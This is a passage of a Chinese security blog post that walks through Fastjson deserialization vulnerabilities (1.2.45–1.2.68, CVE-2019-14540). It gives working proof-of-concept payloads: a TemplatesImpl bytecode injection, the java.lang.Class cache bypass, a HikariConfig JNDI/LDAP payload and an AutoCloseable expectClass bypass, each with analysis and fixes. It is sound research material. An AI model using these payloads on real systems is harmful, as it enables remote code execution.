class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String poc=<span class="string">"&#123;<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"<span class="subst">\"</span>@type<span class="subst">\"</span>:<span class="subst">\"</span>[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span class="subst">\"</span>,<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"<span class="subst">\"</span>_bytecodes<span class="subst">\"</span>:[<span class="subst">\"</span>"</span>+evilCode+<span class="string">"<span class="subst">\"</span>],<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"<span class="subst">\"</span>_name<span class="subst">\"</span>:<span class="subst">\"</span>xx<span class="subst">\"</span>,<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"<span class="subst">\"</span>_tfactory<span class="subst">\"</span>:&#123; &#125;,<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"<span class="subst">\"</span>_outputProperties<span class="subst">\"</span>:&#123; &#125;<span class="subst">\n</span>"</span> +</span><br><span class="line">        <span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure><p>提示逗号前需要<code>[</code></p><p><img src="/2021/10/29/Java_06/20211021194045.png" alt="image-20211021194044379"></p><p>又提示在加入的<code>[</code>后需要一个<code>{</code>，加上即可，这里涉及fastjson具体解析字符串的过程，就不再深入分析。</p><p><img src="/2021/10/29/Java_06/20211021194139.png" alt="image-20211021194138796"></p><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>com.alibaba.fastjson.parser#checkAutoType</p><p>直接过滤掉<code>[</code>和<code>;</code>结尾的类</p><p><img src="/2021/10/29/Java_06/20211021194838.png" alt="image-20211021194804574"></p><h2 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2><p>1.2.46~1.2.46版本主要是黑名单的添加，然后到1.2.47版本出现了通杀的payload</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>jdk1.8.0_161</p><p>我本地测试，开不开启autotype都是可以成功的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"> </span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        String poc="&#123;\n" +</span></span><br><span class="line"><span class="comment">//                "\"@type\":\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[,\n" +</span></span><br><span class="line"><span class="comment">//                "\"_bytecodes\":[\""+evilCode+"\"],\n" +</span></span><br><span class="line"><span class="comment">//                "\"_name\":\"xx\",\n" +</span></span><br><span class="line"><span class="comment">//                "\"_tfactory\":&#123; &#125;,\n" +</span></span><br><span class="line"><span class="comment">//                "\"_outputProperties\":&#123; &#125;\n" +</span></span><br><span class="line"><span class="comment">//                "&#125;";</span></span><br><span class="line">        String poc=<span class="string">"[\n"</span> +</span><br><span class="line">                <span class="string">"    &#123;\n"</span> +</span><br><span class="line">                <span class="string">"        \"@type\": \"java.lang.Class\", \n"</span> +</span><br><span class="line">                <span class="string">"        \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\n"</span> +</span><br><span class="line">                <span class="string">"    &#125;, \n"</span> +</span><br><span class="line">                <span class="string">"    &#123;\n"</span> +</span><br><span class="line">                <span class="string">"       \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \n"</span> +</span><br><span class="line">                <span class="string">"       \"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"       \"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"       \"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span class="string">"       \"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"    &#125;\n"</span> +</span><br><span class="line">                <span class="string">"]"</span>;</span><br><span class="line"> </span><br><span class="line">        System.out.println(poc);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>从parseObject开始分析</p><p>com.alibaba.fastjson.parser#parseObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">//checkAutoType检测</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                        typeName = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">                            strValue = <span class="keyword">null</span>;</span><br><span class="line">                            Class clazz;</span><br><span class="line">                            <span class="keyword">if</span> (object != <span class="keyword">null</span> &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">                                clazz = object.getClass();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                clazz = <span class="keyword">this</span>.config.checkAutoType(typeName, (Class)<span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">                            &#125;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">//deserializer.deserialze加载</span></span><br><span class="line">    ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                                thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">                                <span class="keyword">return</span> thisObj;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层payload <code>java.lang.Class</code>不在黑名单内，比较特殊的是这个类类对应的deserializer为MiscCodec</p><p>com.alibaba.fastjson.serializer#deserialze</p><p>前面为格式检测，这里会检测<code>@type</code>后面一个键是否为<code>val</code>，然后将其值赋予<code>strVal</code></p><p><img src="/2021/10/29/Java_06/20211022201421.png" alt="image-20211022201413150"></p><p><img src="/2021/10/29/Java_06/20211022201525.png" alt="image-20211022201524635"></p><p>这里<code>clazz == Class.class</code>满足，进入<code>TypeUtils.loadClass</code>，然后可以看到默认调用的话，第三个参数是为<code>true</code>的</p><p><img src="/2021/10/29/Java_06/20211022201614.png" alt="image-20211022201613312"></p><p>com.alibaba.fastjson.util#loadClass</p><p><code>classLoader.loadClass</code>加载<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类后放入缓存的mapping里面</p><p><img src="/2021/10/29/Java_06/20211022201848.png" alt="image-20211022201847799"></p><p>当第二个<code>@type</code>解析时，我们跟一下checkAutoType的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">     <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;               </span><br><span class="line"> </span><br><span class="line">         <span class="comment">//黑白名单判断</span></span><br><span class="line">         String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">         Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">         <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">         <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">         <span class="keyword">long</span> h1 = (-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">         <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((h1 ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">long</span> h3 = (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">2</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">             <span class="keyword">long</span> hash;</span><br><span class="line">             <span class="keyword">int</span> i;</span><br><span class="line">             <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 hash = h3;</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                     hash ^= (<span class="keyword">long</span>)className.charAt(i);</span><br><span class="line">                     hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                     <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                         clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                         <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                             <span class="keyword">return</span> clazz;</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line"> </span><br><span class="line">                     <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                         <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                 clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                 clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure><p>当<code>autoTypeSupport</code>关闭的时候，直接<code>clazz = TypeUtils.getClassFromMapping(typeName)</code>，从mapping里面获取类，当其开启的时候，白名单肯定不满足，但是黑名单判断的时候<code>Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null</code>要求满足符合黑名单并且不再mapping内才会抛出异常，所以也会进入<code>clazz = TypeUtils.getClassFromMapping(typeName)</code>逻辑，开不开启autype都是可以的</p><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.2.48版本直接设置MiscCode类deserialze方法的<code>TypeUtils.loadClass</code>的第三个参数为false</p><p><img src="/2021/10/29/Java_06/20211022203742.png" alt="image-20211022203741051"></p><h2 id="1-2-59（CVE-2019-14540）"><a href="#1-2-59（CVE-2019-14540）" class="headerlink" title="1.2.59（CVE-2019-14540）"></a>1.2.59（CVE-2019-14540）</h2><p>后面版本就基本上是开启autotype，和黑名单的对抗了</p><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>jdk1.8.0_161，版本需要小于jdk 191，ldap注入</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zaxxer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>HikariCP<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parse(<span class="string">"&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://127.0.0.1:1389/Exploit\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>com.zaxxer.hikari#setMetricRegistry</p><p><img src="/2021/10/29/Java_06/20211029145605.png" alt="image-20211029145555396"></p><p>metricRegistry可控，getObjectOrPerformJndiLookup函数存在lookup绑定refference的操作，可以JNDI注入</p><p><img src="/2021/10/29/Java_06/20211029145753.png" alt="image-20211029145752891"></p><h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>expectClass绕过AutoType</p><p>1.2.61开始，黑名单从十进制变成了十六进制，1.2.62开始，黑名单从小写变成了大写</p><p>1.2.48-1.2.68黑名单绕过的有很多，这里不再赘述，文末链接有</p><p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType</p><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li>jdk1.8.0_161</li><li>fastjson 1.2.68</li><li>开不开启autotype都是可以的</li></ul><p>服务端存在如下实现AutoCloseable接口类的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title">AutoCloseable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulAutoCloseable</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        JSON.parse(<span class="string">"&#123;\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"demo.VulAutoCloseable\",\"cmd\":\"calc\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>com.alibaba.fastjson.parser#checkAutoType</p><p>第一个类java.lang.AutoCloseable，直接从mapping中获取</p><p><img src="/2021/10/29/Java_06/20211029163319.png" alt="image-20211029163317737"></p><p>然后回到 com.alibaba.fastjson.parser#parseObject，调用JavaBeanDeserializer的deserialze</p><p><img src="/2021/10/29/Java_06/20211029163602.png" alt="image-20211029163601231"></p><p>这里主要逻辑就读取第二个<code>@type</code>对应的类名，这里找不到对应的deserializer，会二次进入checkAutoType函数</p><p><img src="/2021/10/29/Java_06/20211029163732.png" alt="image-20211029163731484"></p><p>这里expectclass参数为java.lang.AutoCloseable</p><p><img src="/2021/10/29/Java_06/20211029163927.png" alt="image-20211029163926567"></p><p>expectClass不为null，且不为下面几种class，expectClassFlag被设置为true</p><p><img src="/2021/10/29/Java_06/20211029164051.png" alt="image-20211029164050636"></p><p>expectClassFlag为true，这里不受autotype影响，直接loadClass</p><p><img src="/2021/10/29/Java_06/20211029164317.png" alt="image-20211029164316066"></p><p>最后会检测clazz是否为expectClass的子类或者实现了其接口，所以恶意类要求实现AutoCloseable接口</p><p><img src="/2021/10/29/Java_06/20211029164658.png" alt="image-20211029164657186"></p><p>需要找实现AutoCloseable接口的类，IntputStream和OutputStream都是实现自AutoCloseable接口的，再找继承他们的类，同时需要调用其恶意的set或者get方法</p><p>实际利用有限，可以复制，写入文件。写入文件也有限制，不能写入特殊字符，比如不能写入PHP代码，POC可参考<a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">这里</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/7027" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li><li><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入原理及利用</a></li><li><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">Fastjson 反序列化漏洞史</a></li><li><a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Fastjson系列六——1.2.48-1.2.68反序列化漏洞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。&lt;/p&gt;
&lt;p&gt;Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。&lt;/p&gt;
&lt;h2 id=&quot;Fastjson组件&quot;&gt;&lt;a href=&quot;#Fastjson组件&quot; class=&quot;headerlink&quot; title=&quot;Fastjson组件&quot;&gt;&lt;/a&gt;Fastjson组件&lt;/h2&gt;&lt;p&gt;Fastjson使用包含如下几个核心函数&lt;/p&gt;
&lt;figure class=&quot;highlight reasonml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String text = &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;JSON&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;constructor&quot;&gt;JSONString(&lt;span class=&quot;params&quot;&gt;obj&lt;/span&gt;)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//反序列化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VO vo = &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span 